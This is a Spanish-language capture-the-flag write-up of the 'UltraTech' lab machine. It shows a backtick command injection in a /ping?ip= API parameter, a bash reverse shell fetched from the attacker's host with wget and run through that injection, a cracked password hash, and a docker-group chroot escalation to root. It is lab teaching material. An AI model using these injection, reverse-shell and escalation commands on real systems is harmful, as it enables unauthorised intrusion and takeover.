<h1 align="center"> UltrTech </h1>

# INTRODUCCIÓN

Nos enfrentamos contra la máquina UltraTech. Es una grey-box, y la unica información que tenemos es el nombre de la compañia y su servidor ip.

# ENUMERACIÓN

Test de conectividad

```
ping <IP>
```

![image](https://github.com/user-attachments/assets/925bfb09-e1e6-400a-bdaa-fcc3d26ceac3)

Enumeración de puertos

![image](https://github.com/user-attachments/assets/369c2400-bbe1-49bf-b7b8-306d6de87737)

- 21 - ftp
- 22 - ssh
- 8081 - http - Node.js Express framework

Si hacemos un escaner más intenso encontraremos otro puerto 

![image](https://github.com/user-attachments/assets/c4eddcb0-1c45-491d-88d0-d9873020f558)

- 31331/tcp - http Apache httpd 2.4.29 (Ubuntu)

Como vemos tenemos 2 puertos usando la aplicación web.

# FOOTHOLD

Ahora que sabemos los servicios que corren, es tiempo de explotar. 

Vamos a explorar un poco lo que vemos.

![image](https://github.com/user-attachments/assets/949a6b4e-be5c-44ae-97e7-fdc0c148a37d)

Nos encontramos esto en el puerto 8081 que nos da información sobre la API "UltraTech API v0.1.3"

![image](https://github.com/user-attachments/assets/9e1a268f-dd3e-443a-8c87-27db8913d9ba)

En este puerto nos encontramos ya cosas jugosas.

En el apartado de correo nos encontramos una información sobre dicho correo "/ultratech@yopmail.com" puede que nos sirva o no pero nosotros recolectamos la info.

Como vemos que no encontramos muchas mas cosas importantes que yo considere vamos a probar con un fuzeo

![image](https://github.com/user-attachments/assets/7e156d6a-6de2-422c-9371-dc728c935521)

![image](https://github.com/user-attachments/assets/51f44401-12a9-4415-a61f-c011671f9936)

Nos encontramos con varios directorios y inspeccionando, /js podría tener algo interesante

Nos encontramoe el archivo "api.js" el cual chekea el status de la api, haciendo pings "getAPIURL" al puero 8081, sabiendo esto probemos a irnos al puerto 8081 y poner dicha ruta.

```
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();
```

![image](https://github.com/user-attachments/assets/eefd84f5-dfb9-4130-90fd-3b3786b898ac)

VEmos que funciona perfectamente, intentemos hacer una inserción de comandos

![image](https://github.com/user-attachments/assets/f2168265-179f-4d98-a83c-02463ac739f8)

Después de estar un rato buscando, la forma de "escapar" para poder inyectar comandos es tan simple como poner un "`" la url : 

![image](https://github.com/user-attachments/assets/ff794de9-5f4a-4ccc-8761-3a45d0e95c86)

Encontramos la base de datos en la que esta "utech.db.sqlite" pero si podemos hacer esto podemos intentar también entrar con una rev shell.

Creamos una: 

```
echo "bash -i >& /dev/tcp/10.10.78.225/4242 0>&1" > shell.sh
```

![image](https://github.com/user-attachments/assets/dcae2792-20b4-430e-a092-9ff6608a991e)

Posteriormente en la url descargamos dicho archivo y lo ejecutamos.

![image](https://github.com/user-attachments/assets/81e8dfae-3c2d-4202-aa4d-ab52e203d25c)

```
http://10.10.203.247:8081/ping?ip=`wget%20http://10.10.78.225:8000/shell.sh%20shell.sh`
http://10.10.203.247:8081/ping?ip=`bash shell.sh`
```

ATENCIÓN DEBEREMOS TENER ABIERTO UN SERVIDOR HTTP PARA LA DESCARGA Y UN NC

```
python3 -m http.server
nc -lvnp 4242
```

![image](https://github.com/user-attachments/assets/1d5fc2e7-388d-46f7-a0fa-55839b7ed749)

Estamos dentro!!!

# EXPLOTACIÓN

Posteriormente al haber entrado vamos a ver si tenemos disponibilidad de algo.

![image](https://github.com/user-attachments/assets/10fe11a4-312d-4201-98bf-75fb4a6dc14d)

![image](https://github.com/user-attachments/assets/3f276418-95ad-4afa-9d98-0f53221e8c1c)

Conseguimos dos hashes probemos a descifrarlos.

"r00t:f357a0c52799563c7c7b76c1e7543a32"

Podemos utilizar hashcat o john, pero probaremos si podemos hacerlo en la crackstation.

![image](https://github.com/user-attachments/assets/9b60706a-4f1a-491a-b5c4-1506adeec89d)

La tenemos 

r00t:n100906

Gracias a estas claves podemos entrar por ssh

![image](https://github.com/user-attachments/assets/dd0fc3a0-ed61-4855-b3cf-867a888494ee)

![image](https://github.com/user-attachments/assets/00454f19-4f0e-4f87-b0d4-e618c3a916d5)

Algo importante a resaltar esque pertenemos al grupo "docker"

![image](https://github.com/user-attachments/assets/b3f168c1-b8b8-4940-b6ea-7f617bd0871c)

Veamos si podemos tirar de ahi

![image](https://github.com/user-attachments/assets/b65bc0c5-3be0-4dfc-980a-598ff60c1638)

Guay creo que hemos encontrado el vector por donde conseguir el root, vemos que hay una imagen de bash, veamos si podemos ejecutarla.

he encontrado información por aquí [docker](https://gtfobins.github.io/gtfobins/docker/)

Nos dice que para generar una shell, podemos destrozar restricciones interactivas y crear una imagen.


```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

la diferencia esque nuestra sesión se llama "bash" con lo cual lo cambiaremos por eso y probaremos a ver si funciona.

![image](https://github.com/user-attachments/assets/d84b1b0c-b526-4f79-89aa-dbf462bc7516)

GG!!!!!!

si queremos sacar las cables ssh:

![image](https://github.com/user-attachments/assets/d072eed1-78a4-49a3-b6f6-df3586aaffa0)










